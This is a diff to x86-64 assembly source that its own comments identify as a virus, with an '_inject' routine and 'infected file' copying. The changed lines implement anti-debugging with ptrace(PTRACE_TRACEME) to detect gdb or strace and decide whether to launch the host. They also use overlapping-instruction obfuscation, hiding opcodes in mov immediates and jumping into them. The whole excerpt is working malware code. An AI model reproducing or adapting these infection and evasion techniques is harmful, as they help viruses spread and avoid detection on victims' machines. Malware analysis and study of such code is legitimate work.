@@ -44,10 +44,13 @@ _inject:
 	sub r8, 0x5; sub call instr
 	; r8 contains the entry of the virus (for infected file cpy)
 
-	xor rdi, rdi; PTRACE_TRACEME
-	xor rsi, rsi
-	jmp $+4; has to skip 2 byte of instruction next line
-	mov rdx, 0x656ac93148d23148
+	; THIS PART IS BLACK MAGIC, DON'T EDIT IT
+	; Basically it ptrace(0, 0, 0 ,0) to check if something is tracing the
+	; binary (gdb, strace, ...), and then it select host or not launching
+	jmp $+4; -- skip mov rax
+	mov rax, 0x02ebf63148ff3148; xor rdi, rdi; xor rsi, rsi; jmp $+4
+;   -- has to skip 2 byte of instruction next line
+	mov rdx, 0x656ac93148d23148; xor rdx, rdx; xor rcx, rcx; push 101 -- ptrace
 	pop rax
 	syscall
 
@@ -60,6 +63,7 @@ _inject:
 	mov rax, 1
 	syscall
 
+	; Wtf am I doing with my life
 	jmp $+4; has to skip 2 byte of instruction next line
 	mov rdi, 0x03eb583c6a5f016a; push 1; pop rdi; push 60; pop rax; jmp $+5
 	;                            from right to left
